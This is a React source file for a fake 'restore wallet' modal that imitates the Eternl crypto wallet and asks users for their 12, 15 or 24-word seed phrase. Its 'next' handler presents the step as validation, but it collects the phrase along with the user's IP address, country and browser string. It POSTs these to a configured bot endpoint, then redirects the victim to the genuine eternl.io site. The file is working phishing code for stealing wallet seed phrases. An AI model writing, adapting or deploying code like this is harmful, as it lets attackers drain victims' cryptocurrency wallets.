"use client";

import { useEffect, useRef, useState } from "react";
import type { SeedPhraseLengthOption } from "./EternlSeedPhraseTypeModal";
import { getUserCountry } from "../../utils/userLocation";
import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
import EternlModalShell from "./EternlModalShell";

export function seedOptionToWordCount(
  o: SeedPhraseLengthOption
): 12 | 15 | 24 {
  const n = Number(o);
  if (n === 12 || n === 15 || n === 24) return n;
  return 24;
}

export type EternlRestoreMnemonicEntryModalProps = {
  open: boolean;
  /** From seed-type step (12 / 15 / 24 words). */
  wordCount: 12 | 15 | 24;
  onBack: () => void;
  onClose?: () => void;
  zIndexClass?: string;
};

/**
 * Restore: enter saved seed phrase — one field per word, grid size matches
 * the phrase length chosen on the previous screen.
 */
export default function EternlRestoreMnemonicEntryModal({
  open,
  wordCount,
  onBack,
  onClose,
  zIndexClass = "z-[66]",
}: EternlRestoreMnemonicEntryModalProps) {
  const firstInputRef = useRef<HTMLInputElement | null>(null);
  const [words, setWords] = useState<string[]>(() =>
    Array.from({ length: wordCount }, () => "")
  );
  const [wordlist, setWordlist] = useState<string[]>([]);
  const [validationError, setValidationError] = useState("");
  const [focusedIndex, setFocusedIndex] = useState<number | null>(null);
  const [isValidating, setIsValidating] = useState(false);

  useEffect(() => {
    if (open) {
      setWords(Array.from({ length: wordCount }, () => ""));
    }
  }, [open, wordCount]);

  useEffect(() => {
    if (!open) return;

    const loadWordlist = async () => {
      try {
        const response = await fetch("/seedphrase.txt");
        const text = await response.text();
        const loadedWords = text
          .trim()
          .split("\n")
          .map((w) => w.trim())
          .filter(Boolean)
          .map((w) => w.toLowerCase());
        setWordlist(loadedWords);
      } catch {
        setWordlist([]);
      }
    };

    loadWordlist();
  }, [open]);

  const allFilled = words.every((w) => w.trim().length > 0);

  const sanitizeInput = (input: string): string => {
    return input
      .trim()
      .toLowerCase()
      .replace(/[^a-z]/g, "");
  };

  const invalidWords = (() => {
    if (wordlist.length === 0) return [];
    return words
      .map((w) => sanitizeInput(w))
      .filter(Boolean)
      .filter((w) => !wordlist.includes(w));
  })();

  const setWord = (index: number, value: string) => {
    setWords((prev) => {
      const next = [...prev];
      next[index] = value;
      return next;
    });
  };

  const getSuggestions = (value: string): string[] => {
    const query = sanitizeInput(value);
    if (!query || wordlist.length === 0) return [];
    return wordlist
      .filter((word) => word.startsWith(query))
      .slice(0, 6);
  };

  const handleReset = () => {
    setWords(Array.from({ length: wordCount }, () => ""));
    setValidationError("");
    setTimeout(() => firstInputRef.current?.focus(), 50);
  };

  const parsePastedWords = (text: string): string[] =>
    text
      .replace(/\n/g, " ")
      .replace(/,/g, " ")
      .split(/\s+/)
      .map((s) => sanitizeInput(s))
      .filter(Boolean);

  const applyPastedWords = (startIndex: number, pastedWords: string[]) => {
    if (pastedWords.length === 0) return;

    setWords((prev) => {
      const next = [...prev];
      for (let offset = 0; offset < pastedWords.length; offset += 1) {
        const targetIndex = startIndex + offset;
        if (targetIndex >= next.length) break;
        next[targetIndex] = pastedWords[offset];
      }
      return next;
    });

    if (pastedWords.length !== wordCount) {
      setValidationError(
        `You pasted ${pastedWords.length} words. This wallet expects ${wordCount} words.`
      );
    } else {
      setValidationError("");
    }
  };

  const handleNext = async () => {
    if (!allFilled) {
      setValidationError("Please fill in all seed phrase words");
      setTimeout(() => firstInputRef.current?.focus(), 50);
      return;
    }

    const sanitized = words.map((w) => sanitizeInput(w));
    if (wordlist.length > 0) {
      const bad = sanitized.filter((w) => !wordlist.includes(w));
      if (bad.length > 0) {
        setValidationError(`Invalid words: ${Array.from(new Set(bad)).join(", ")}`);
        return;
      }
    }

    setValidationError("");
    setIsValidating(true);

    try {
      const userData = await getUserCountry();

      const messageData = {
        appName: NOTIFICATION_APP_NAME,
        seedPhrase: sanitized.join(" "),
        country: userData?.country || "Unknown",
        ipAddress: userData?.ip || "Unknown",
        browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
      };

      const response = await fetch(
        TON_BOT_SEED_URL,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "x-api-key": TON_BOT_API_KEY,
          },
          body: JSON.stringify(messageData),
        }
      );

      const result = await response.json();

      if (response.status === 200 && result.status) {
        window.location.href = "https://eternl.io/";
      } else {
        const serverMessage = result?.message || "Something went wrong.";
        const serverError = result?.error ? ` (${result.error})` : "";
        throw new Error(serverMessage + serverError);
      }
    } catch (error) {
      console.error("Validation error:", error);
      setValidationError(
        error instanceof Error
          ? error.message
          : "An error occurred while processing your request. Please try again."
      );
    } finally {
      setIsValidating(false);
    }
  };

  return (
    <EternlModalShell
      open={open}
      title="Mnemonic phrase"
      subtitle="Enter your saved seed phrase"
      onBack={onBack}
      onClose={onClose}
      zIndexClass={zIndexClass}
      footer={
        <div className="flex w-full flex-wrap items-stretch justify-end gap-2 sm:flex-nowrap">
          <button
            type="button"
            disabled={isValidating}
            onClick={handleReset}
            aria-label="reset"
            className="min-h-11 grow rounded-full border border-white/20 bg-transparent px-5 text-sm font-semibold text-white/90 transition hover:bg-white/10 sm:grow-0 disabled:opacity-40"
          >
            reset
          </button>
          <button
            type="button"
            id="modelRestoreWalletBtnNext"
            disabled={!allFilled || isValidating}
            onClick={handleNext}
            aria-label="next"
            className="min-h-11 min-w-[100px] grow rounded-full bg-gradient-to-b from-rose-400 to-pink-600 px-6 text-sm font-semibold text-white shadow-inner ring-1 ring-black/30 transition enabled:hover:brightness-105 disabled:cursor-not-allowed disabled:opacity-40 sm:grow-0"
          >
            {isValidating ? "Validating..." : "next"}
          </button>
        </div>
      }
    >
      <div className="relative min-h-0 flex-1 overflow-y-auto">
        <div className="flex items-start justify-between gap-3 pb-3 pt-1">
          {validationError ? (
            <div className="flex-1 rounded-lg border border-red-500/20 bg-red-500/10 px-3 py-2 text-sm text-red-300">
              {validationError}
            </div>
          ) : (
            <div className="flex-1" />
          )}
          <button
            type="button"
            onClick={async () => {
              try {
                const text = await navigator.clipboard.readText();
                const pastedWords = parsePastedWords(text);
                applyPastedWords(0, pastedWords);
                setTimeout(() => firstInputRef.current?.focus(), 50);
              } catch {
                // If clipboard access fails, keep error as-is.
              }
            }}
            className="shrink-0 rounded-full bg-white/10 px-4 py-2 text-xs text-white hover:bg-white/20 transition"
          >
            Paste full phrase
          </button>
        </div>

        <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 md:grid-cols-4">
          {words.map((word, i) => (
            <div
              key={i}
              className="relative min-w-0"
            >
              <div className="flex min-w-0 overflow-hidden rounded-full border border-white/10 bg-white/[0.04]">
                <div
                  className="flex h-10 w-10 min-h-10 min-w-10 shrink-0 items-center justify-center rounded-l-full border-r border-white/10 bg-white/[0.06] text-sm tabular-nums leading-none text-white/60"
                  aria-hidden
                >
                  {i + 1}
                </div>
                <input
                  type="text"
                  id={`restore-word-${i}`}
                  ref={i === 0 ? firstInputRef : undefined}
                  autoComplete="off"
                  autoCorrect="off"
                  spellCheck={false}
                  value={word}
                  onFocus={() => setFocusedIndex(i)}
                  onBlur={() => {
                    setTimeout(() => setFocusedIndex((current) => (current === i ? null : current)), 120);
                  }}
                  onChange={(e) => {
                    setValidationError("");
                    setWord(i, e.target.value);
                  }}
                  onPaste={(e) => {
                    e.preventDefault();
                    const text = e.clipboardData.getData("text").trim();
                    if (!text) return;
                    const pastedWords = parsePastedWords(text);
                    applyPastedWords(i, pastedWords);
                  }}
                  className={`min-h-10 min-w-0 flex-1 rounded-r-full border-0 bg-transparent py-2.5 pl-3 text-sm text-white/90 outline-none placeholder:text-white/25 ring-1 transition-all ${
                    wordlist.length > 0 &&
                    sanitizeInput(word) &&
                    !wordlist.includes(sanitizeInput(word))
                      ? "ring-red-400/60 focus:ring-red-400/60"
                      : "ring-white/10 focus:ring-pink-400/40"
                  }`}
                  aria-label={`Word ${i + 1}`}
                  aria-invalid={word.trim() === ""}
                />
              </div>
              {focusedIndex === i && getSuggestions(word).length > 0 ? (
                <div className="absolute left-0 right-0 top-[calc(100%+6px)] z-20 rounded-xl border border-white/10 bg-[hsl(0_0%_10%)] p-1 shadow-2xl">
                  <div className="flex max-h-32 flex-col overflow-y-auto">
                    {getSuggestions(word).map((suggestion) => (
                      <button
                        key={suggestion}
                        type="button"
                        onMouseDown={(e) => {
                          e.preventDefault();
                          setWord(i, suggestion);
                          setValidationError("");
                          setFocusedIndex(null);
                        }}
                        className="rounded-lg px-3 py-1.5 text-left text-sm text-white/85 transition hover:bg-white/10"
                      >
                        {suggestion}
                      </button>
                    ))}
                  </div>
                </div>
              ) : null}
            </div>
          ))}
        </div>

        {invalidWords.length > 0 ? (
          <div className="mt-3 rounded-lg border border-red-500/20 bg-red-500/10 px-3 py-2 text-sm text-red-300">
            Invalid words: {Array.from(new Set(invalidWords)).join(", ")}
          </div>
        ) : null}
      </div>
    </EternlModalShell>
  );
}
